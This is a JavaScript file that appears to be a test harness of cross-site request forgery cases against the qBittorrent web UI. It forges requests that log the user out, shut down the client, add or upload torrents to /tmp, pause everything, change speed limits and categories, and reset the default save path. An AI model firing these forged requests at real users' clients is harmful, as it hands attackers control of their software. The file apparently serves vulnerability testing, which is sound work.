import CSRF from './lib/csrf';
import loadImage from './lib/load-image';
import base64ToBlob from './lib/base64-to-blob';
import prepareLogin from './lib/prepare-login';
import randomPath from './lib/random-path';
import postForm from './lib/post';

const Cases = () => [
  CSRF(
    '/logout',
    loadImage,
    prepareLogin(), [
      'Now refresh qBittorrent webui',
      'Check your login state, have you been logged out?',
    ]
  ),
  CSRF(
    '/command/shutdown',
    loadImage,
    prepareLogin(), [
      'Now check your qBittorrent process',
      'Is qBittorrent exited?',
    ]
  ),
  CSRF(
    '/command/download',
    url =>
      postForm(
        url, {
          urls: 'http://sample-file.bazadanni.com/download/applications/torrent/sample.torrent',
          savepath: '/tmp',
          paused: 'true',
        },
        true
      ),
    prepareLogin(), [
      'Now check your qBittorrent tasks',
      'Is there a new task named "sample"?',
    ]
  ),
  CSRF(
    '/command/upload',
    url =>
      postForm(
        url, {
          torrents: {
            type: 'blob',
            data: base64ToBlob('ZDEwOmNyZWF0ZWQgYnkxOTpxQml0dG9ycmVudCB2My4zLjEwMTM6Y3JlYXRpb24gZGF0ZWkxNDkzOTYyNTQ4ZTQ6aW5mb2Q2Omxlbmd0aGk0N2U0Om5hbWU4OnByb3h5LmpzMTI6cGllY2UgbGVuZ3RoaTE2Mzg0ZTY6cGllY2VzMjA6OLtJNZtIaLqMR/MZaBICPSBCvullODp1cmwtbGlzdDA6ZQ=='),
            filename: 'proxy.js.torrent',
          },
          savepath: '/tmp',
          paused: 'true',
        },
        true
      ),
    prepareLogin(), [
      'Now check your qBittorrent tasks',
      'Is there a new task named "proxy.js"?',
    ]
  ),
  CSRF(
    '/command/pauseAll',
    url =>
      postForm(
        url
      ),
    prepareLogin('Make sure you have some tasks running'), [
      'Now check your qBittorrent tasks',
      'Are all the torrents paused?',
    ]
  ),
  CSRF(
    '/command/resumeAll',
    url =>
      postForm(
        url
      ),
    prepareLogin('Make sure you have some tasks paused'), [
      'Now check your qBittorrent tasks',
      'Are all the torrents resumed?',
    ]
  ),
  CSRF(
    '/command/setGlobalDlLimit',
    url =>
      postForm(
        url, {
          limit: 1024,
        }
      ),
    prepareLogin(), [
      'Now check the global download limit for your qBittorrent',
      'Is the global download limit now 1KiB/s?',
    ]
  ),
  CSRF(
    '/command/setGlobalUpLimit',
    url =>
      postForm(
        url, {
          limit: 1024,
        }
      ),
    prepareLogin(), [
      'Now check the global upload limit for your qBittorrent',
      'Is the global upload limit now 1KiB/s?',
    ]
  ),
  CSRF(
    '/command/addCategory',
    url =>
      postForm(
        url, {
          category: 'csrf-category',
        }
      ),
    prepareLogin(), [
      'Now check the categories of your qBittorrent',
      'Is there a new category named "csrf-category"?',
    ]
  ),
  CSRF(
    '/command/removeCategories',
    url =>
      postForm(
        url, {
          categories: 'csrf-category',
        }
      ),
    prepareLogin(), [
      'Now check the categories of your qBittorrent',
      'Is there the category "csrf-category" removed?',
    ]
  ),
  CSRF(
    '/command/setPreferences',
    url =>
      postForm(
        url, {
          json: JSON.stringify({
            save_path: randomPath.gen(),
          }),
        }
      ),
    prepareLogin(),
    () =>
      ([
        'Now check the default download path of your qBittorrent',
        `Is the default download path now "${randomPath.get()}"?`,
      ])
  ),
  CSRF(
    '/command/toggleAlternativeSpeedLimits',
    url =>
      postForm(
        url
      ),
    prepareLogin(), [
      'Now check your qBittorrent UI',
      'Is the alternate speed state toggled?',
    ]
  ),
];

export default Cases;
